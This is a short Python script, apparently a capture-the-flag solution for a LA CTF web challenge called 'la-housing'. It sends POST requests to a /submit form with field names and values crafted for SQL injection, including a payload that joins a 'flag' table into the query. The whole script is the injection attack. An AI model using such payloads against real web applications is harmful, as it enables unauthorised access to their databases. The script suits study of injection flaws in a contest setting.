import requests

# r = requests.post("https://la-housing.chall.lac.tf/submit", data={"name": "gil"})
# r = requests.post("https://la-housing.chall.lac.tf/submit", data={"name": "gil", "1=1;": "1"})
r = requests.post("http://192.168.68.74:8080/submit", data={"name": "a", "'1'": "1' join flag where '1' = '1"})
print(r.text)